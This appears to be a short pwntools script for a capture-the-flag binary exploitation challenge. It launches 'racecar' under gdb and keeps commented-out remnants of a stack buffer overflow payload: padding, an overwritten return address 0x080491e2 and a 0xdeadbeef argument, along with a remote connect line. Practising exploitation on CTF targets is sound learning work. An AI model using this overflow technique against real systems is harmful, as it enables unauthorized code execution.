#!/usr/bin/python3
import pwn
e = pwn.context.binary = pwn.ELF("./racecar")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
    +"\nbreak *main+57"
#   +"\nbreak *0x08049243"
    +"\nc"
)
#p = e.process()
#p = pwn.connect("83.136.254.199","41637")
#p.recvuntil("0xDiablos: ")

#payload=b"A"*188
#payload+=pwn.p32(0x080491e2)
#payload+=b"C"*4




#payload += pwn.p32(0xdeadbeef)

#p.sendline(payload)



p.interactive()


